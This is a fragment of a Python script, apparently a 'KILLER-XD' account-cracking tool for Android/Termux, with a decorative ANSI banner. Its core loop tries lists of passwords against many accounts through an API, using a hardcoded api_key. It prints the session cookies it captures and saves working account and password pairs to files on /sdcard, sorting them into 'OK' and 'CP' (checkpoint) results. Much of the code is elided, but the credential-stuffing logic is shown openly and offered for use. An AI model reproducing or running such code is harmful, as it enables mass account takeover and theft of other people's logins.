...
logo=(f"""\u001b[1;96m
__  ___  __   __       __       _______ .______         
|  |/  / |  | |  |     |  |     |   ____||   _  \        
|  '  /  |  | |  |     |  |     |  |__   |  |_)  |       
|    <   |  | |  |     |  |     |   __|  |      /        
|  .  \  |  | |  `----.|  `----.|  |____ |  |\  \----.   
|__|\__\ |__| |_______||_______||_______|| _| `._____|   
\033[1;32m XD\033[1;37m 
[•] AUTHOR     : '\033[91;1m'KILLER👑\033[1;37m
[•] GITHUB     : '\x1b[0m'KILLER-XD👑\033[1;37m
[•] TOOL NAME  :'\033[96;1m'🤗\033[1;37m
[•] TOOL TYPE  :'\033[94;1m'FILE\033[1;37m
[•] STATUS     : '\033[93;1m'C.S.FREE👑🤠\033[1;37m
\u001b[0;1m
""")
def clear():
   os.system('clear')
...
def method():
    ...
    def start(user):
     try:
        ...
        sys.stdout.write(f'\r {R}[{W}KILLER{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
    ...
    "api_key": "882a8490361da98702bf97a021ddc14d",
              ...
              if "session_key" in response:
                 ...
                 print(" [Cookie] ",cookie)
                 open('/sdcard/killer-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 break
              elif "User must verify their account" in response:
                cpu.append(acc)
                print('\033[1;31m[OK] \033[1;31m'+acc+' \033[1;31m|\033[1;31m '+pswd)
                open('/sdcard/killer-CP.txt','a').write(f'{acc}|{pswd}\n')
                break
              else:
                   continue   
